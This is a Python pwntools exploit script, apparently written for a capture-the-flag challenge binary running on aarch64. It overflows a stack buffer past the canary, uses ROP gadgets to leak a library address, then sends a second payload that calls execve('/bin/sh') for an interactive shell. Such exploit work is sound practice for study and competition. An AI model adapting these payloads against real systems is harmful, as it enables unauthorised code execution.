#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template ./chal
from pwn import *


GOFF   = 0x555555554000                               # GDB default base address
IP     = 'localhost'                                           # remote IP
PORT   = 36969                                            # remote PORT
BINARY = './source/chall'                                     # PATH to local binary
ARGS   = []                                           # ARGS supplied to binary
ENV    = {}                                           # ENV supplied to binary
BOX    = 'ubuntu:noble'                               # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB    = f"""
set follow-fork-mode parent

c"""

context.binary = exe = ELF(BINARY, checksec=False)    # binary
context.aslr = False                                  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None
def setup():
  global vm
  if args.REMOTE or args.LOCAL:
    return None

  try:
    # only load vagd if needed
    from vagd import Dogd, Qegd, Box
  except ModuleNotFoundError:
    log.error('Failed to import vagd, run LOCAL/REMOTE or install it')
  if not vm:
    vm = Dogd(BINARY, image=BOX, symbols=True, ex=True, fast=True)  # Docker
    # vm = Qegd(BINARY, img=Box.QEMU_UBUNTU, symbols=True, ex=True, fast=True)  # Qemu
  if vm.is_new:
    # additional setup here
    log.info('new vagd instance')

  return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process(["qemu-aarch64", "-L", "./source", "-g", "1234", "./source/chall"], env=ENV, **kw)

  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


vm = setup()

#===========================================================
#                   EXPLOIT STARTS HERE
#===========================================================
"""
to attach to process use gdb-multiarch ./chall, then target remote localhost:1234

libz gadgets

0x3b0: SVC 0

binary addresses (no PIE)
0x400470: binsh


canary is at offset 64
"""

context.log_level = 'debug'

t = get_target()
# leak the libz address
# fail the canary check and get a libz leak
# 0x4004c8: LDP gadget
# 0x4004d0: gift
# then set x1 = GOT for flusheverything, x2 = 8, x4 = write gadget for the leak (0x400440)
pl1 = 64*b'a' + p64(0) * 2 + p64(0x4004c8) + p64(0) + p64(0x4004d0) + p64(0x411000) + p64(0x8) + p64(0x400440)
sa(b"> ", pl1)
ru(b"Canary corrupted\n")
libz_leak = u64(rcv(8))
LIBZ_BASE = libz_leak - 0x35c
lhex(LIBZ_BASE, "libz base")
ONE_GADGET = LIBZ_BASE + 0x44c
# overflow buffer with one gadget
# x8 = 221 (execve)
# x0 = "/bin/sh" (0x400500)
# x1 = 0
pl2 = 0x18 * b'a' + p64(221) + p64(0x400500) + p64(0) + 0x20 * b'b' + p64(ONE_GADGET)
se(pl2)
it()

